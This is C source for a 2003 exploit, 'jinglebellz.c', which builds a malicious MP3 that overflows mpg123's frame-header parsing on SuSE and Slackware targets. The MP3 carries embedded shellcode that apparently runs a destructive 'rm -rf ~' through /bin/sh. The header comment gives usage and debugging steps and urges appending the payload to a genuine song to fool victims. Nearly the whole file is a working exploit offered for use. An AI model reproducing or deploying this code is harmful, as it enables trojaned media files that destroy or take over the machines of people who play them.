/* 
   jinglebellz.c - local/remote exploit for mpg123
   (c) 2003 GOBBLES Security seXForces

   To use: 
	$ gcc -o jinglebellz jinglebellz.c
	$ ./jinglebellz X own.mp3
	  (where X is the target number)
	$ mpg123 own.mp3

   If you need help finding specific targets for this
   exploit:
	$ ./jinglebellz 2 debug.mp3
	$ gdb
	 (gdb) file mpg123
	 (gdb) r debug.mp3
	 (gdb) set $p=0xc0000000-4
	 (gdb) while(*$p!=0x41424348)
	  >set $p=$p-1
	  >end
	 (gdb) x/$p
	 0xbfff923c:     0x41424348

   Add the new target to the source, recompile, and 
   try it out!  You might want to supply your own
   shellcode if you're going to use this to own your 
   friends <g>.

   Fun things to do:
   1) Create an evil.mp3 and append it to the end of a
      "real" mp3, so that your victim gets to listen to
      their favorite tunez before handing over access.

      ex: $ ./jinglebellz X evil.mp3 
	  $ cat evil.mp3 >>"NiN - The Day the Whole World Went Away.mp3" 
   
   2) Laugh at Theo for not providing md5sums for the contents of
      ftp://ftp.openbsd.org/pub/OpenBSD/songs/, and continue laughing
      at him for getting his boxes comprimised when "verifying" the
      integrity of those mp3's.  GOOD WORK THEO!@# *clap clap clap clap*

   Special thanks to stran9er for the shellcode. 

   Remember, Napster is Communism, so fight for the American
   way of life.

   Quote:

   "GOBBLES is so 2002" -- anonymous
   ^^^^^^^^^^^^^^^^^^^^
   hehehehehehehe ;PPpPPPPPPppPPPPpP

   Love,
   GOBBLES
   
   Special thanks to Dave Ahmed for supporting this release :>

*/ 
 
 
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define NORMAL_OVF

#define VERSION "0.1"

#define FALSE   0
#define TRUE    1

#define WRITE_ERROR   { perror("write"); close(fd); exit(1); }
#define STATE         { fprintf(stderr, "\n* header (%p) state: %x: ", header, state); state ++; ltb(header); }
#define MP3_SIZE      (((160 * 144000)/8000) - 3) + 8  

#define MAX_INPUT_FRAMESIZE 1920

unsigned char linux_shellcode[] = /* contributed by antiNSA */
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x3b\x50\x31\xc0\x68\x6f"
"\x72\x74\x0a\x68\x6f\x20\x61\x62\x68\x2d\x63\x20\x74\x68\x43"
"\x54\x52\x4c\x68\x73\x2e\x2e\x20\x68\x63\x6f\x6e\x64\x68\x35"
"\x20\x73\x65\x68\x20\x69\x6e\x20\x68\x72\x66\x20\x7e\x68\x72"
"\x6d\x20\x2d\xb3\x02\x89\xe1\xb2\x29\xb0\x04\xcd\x80\x31\xc0"
"\x31\xff\xb0\x05\x89\xc7\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66"
"\xba\x70\x50\x52\xb3\x02\x89\xe1\x31\xd2\xb2\x02\xb0\x04\xcd"
"\x80\x31\xc0\x31\xdb\x31\xc9\x50\x40\x50\x89\xe3\xb0\xa2\xcd"
"\x80\x4f\x31\xc0\x39\xc7\x75\xd1\x31\xc0\x31\xdb\x31\xc9\x31"
"\xd2\x68\x66\x20\x7e\x58\x68\x6d\x20\x2d\x72\x68\x2d\x63\x58"
"\x72\x68\x41\x41\x41\x41\x68\x41\x41\x41\x41\x68\x41\x41\x41"
"\x41\x68\x41\x41\x41\x41\x68\x2f\x73\x68\x43\x68\x2f\x62\x69"
"\x6e\x31\xc0\x88\x44\x24\x07\x88\x44\x24\x1a\x88\x44\x24\x23"
"\x89\x64\x24\x08\x31\xdb\x8d\x5c\x24\x18\x89\x5c\x24\x0c\x31"
"\xdb\x8d\x5c\x24\x1b\x89\x5c\x24\x10\x89\x44\x24\x14\x31\xdb"
"\x89\xe3\x8d\x4c\x24\x08\x31\xd2\x8d\x54\x24\x14\xb0\x0b\xcd"
"\x80\x31\xdb\x31\xc0\x40\xcd\x80";

struct xpl
{
  unsigned char *name;
  unsigned long addrloc; /* LOCATION of our intended func. ptr */
  unsigned long allign;
  unsigned char *sc;
  size_t sclen;
} t[] = 
{
  { "Prepare evil mp3 for SuSE 8.0", 0xbfff923c, 0, linux_shellcode, sizeof(linux_shellcode) },
  { "Prepare evil mp3 for Slackware 8.0", 0xbfff96f4, 0, linux_shellcode, sizeof(linux_shellcode) },
  { "Debug", 0x41424344, 0, linux_shellcode, sizeof(linux_shellcode) }, 
  { NULL, 0x00000000, 0, NULL, 0 }
};
 
int
head_check(unsigned long head)
{    
  if ((head & 0xffe00000) != 0xffe00000)
    return FALSE;
  if (!((head >> 17) & 3))   
    return FALSE;
  if (((head >> 12) & 0xf) == 0xf)
    return FALSE;
  if (((head >> 10) & 0x3) == 0x3)
    return FALSE;
  return TRUE;
}

void
btb(unsigned char byte)
{
  int shift;
  unsigned int bit;
  unsigned char mask;

  for (shift = 7, mask = 0x80; shift >= 0; shift --, mask /= 2)
  {
    bit = 0;
    bit = (byte & mask) >> shift;
    fprintf(stderr, "%01d", bit);
    if (shift == 4) fputc(' ', stderr);
  }
  fputc(' ', stderr);
}

void
ltb(unsigned long blah)
{
  btb((unsigned char)((blah >> 24) & 0xff));
  btb((unsigned char)((blah >> 16) & 0xff));
  btb((unsigned char)((blah >> 8) & 0xff));
  btb((unsigned char)(blah & 0xff));
}

int
main(int argc, char **argv)
{
  int fd;
  unsigned long header;
  unsigned int i;
  unsigned int state;   
  unsigned int tcount;
  unsigned char l_buf[4];

  fprintf(stderr, "@! Jinglebellz.c: mpg123 frame header handling exploit, %s @!\n\n", VERSION);

  if (argc < 3)
  {
    fprintf(stderr, "Usage: %s <target#> <evil.mp3 name>\n\nTarget list:\n\n", argv[0]);
    for (tcount = 0; t[tcount].name != NULL; tcount ++) fprintf(stderr, "%d %s\n", tcount, t[tcount].name);
    fputc('\n', stderr);
    exit(0);
  }
  tcount = atoi(argv[1]);
  if ((fd = open(argv[2], O_CREAT|O_WRONLY|O_TRUNC, 00700)) == -1)
  {
    perror("open");
    exit(1);
  }
  state = 0;
  fprintf(stderr, "+ filling bogus mp3 file\n");
  for (i = 0; i < MP3_SIZE; i ++) if (write(fd, "A", 1) < 0) WRITE_ERROR;
  fprintf(stderr, "+ preparing evil header");
  header = 0xffe00000; /* start state */
  STATE;
  header |= 1 << 18; /* set bit 19, layer 2 */
  STATE;
  header |= 1 << 11; /* set bit 12, freqs index == 6 + (header>>10), se we end up with lowest freq (8000) */
  STATE;
  header |= 1 << 16; /* set fr->error_protection, (off) */
  STATE;
  header |= 1 << 13;
  header |= 1 << 14;
  header |= 1 << 15; /* bitrate index to highest possible (0xf-0x1) */
  STATE;
  header |= 1 << 9; /* fr->padding = ((newhead>>9)&0x1); */
  STATE;
  fprintf(stderr, "\n+ checking if header is valid: %s\n", head_check(header) == FALSE ? "NO" : "YES");
  l_buf[3] = header & 0xff;
  l_buf[2] = (header >> 8) & 0xff;
  l_buf[1] = (header >> 16) & 0xff;
  l_buf[0] = (header >> 24) & 0xff;
  lseek(fd, 0, SEEK_SET);  
  if (write(fd, l_buf, sizeof(l_buf)) < 0) WRITE_ERROR;
  fprintf(stderr, "+ addrloc: %p\n", t[tcount].addrloc);
  l_buf[0] = ((t[tcount].addrloc + 0x04)) & 0xff; 
  l_buf[1] = ((t[tcount].addrloc + 0x04) >> 8) & 0xff;
  l_buf[2] = ((t[tcount].addrloc + 0x04) >> 16) & 0xff;
  l_buf[3] = ((t[tcount].addrloc + 0x04) >> 24) & 0xff;
  if (write(fd, l_buf, sizeof(l_buf)) < 0) WRITE_ERROR;
  lseek(fd, 0, SEEK_SET);
  lseek(fd, MAX_INPUT_FRAMESIZE - t[tcount].sclen, SEEK_SET);
  fprintf(stderr, "+ writing shellcode\n");
  if (write(fd, t[tcount].sc, t[tcount].sclen) < 0) WRITE_ERROR;
  for (i = 0; i < t[tcount].allign; i ++) if (write(fd, "A", 1) < 0) WRITE_ERROR;
#ifdef NORMAL_OVF
  l_buf[0] = ((t[tcount].addrloc + MAX_INPUT_FRAMESIZE/2)) & 0xff; 
  l_buf[1] = ((t[tcount].addrloc + MAX_INPUT_FRAMESIZE/2) >> 8) & 0xff;
  l_buf[2] = ((t[tcount].addrloc + MAX_INPUT_FRAMESIZE/2) >> 16) & 0xff;
  l_buf[3] = ((t[tcount].addrloc + MAX_INPUT_FRAMESIZE/2) >> 24) & 0xff;
#else
  l_buf[0] = ((t[tcount].addrloc - 0x08)) & 0xff; 
  l_buf[1] = ((t[tcount].addrloc - 0x08) >> 8) & 0xff;
  l_buf[2] = ((t[tcount].addrloc - 0x08) >> 16) & 0xff;
  l_buf[3] = ((t[tcount].addrloc - 0x08) >> 24) & 0xff;
#endif 
  for (i = MAX_INPUT_FRAMESIZE + t[tcount].allign; i < MP3_SIZE; i += 4) 
  {
    if (write(fd, l_buf, sizeof(l_buf)) < 0) WRITE_ERROR;
  }
  lseek(fd, 0, SEEK_SET);
  close(fd);
  fprintf(stderr, "+ all done, %s is ready for use\n", argv[2]);
  exit(0);
}  
  
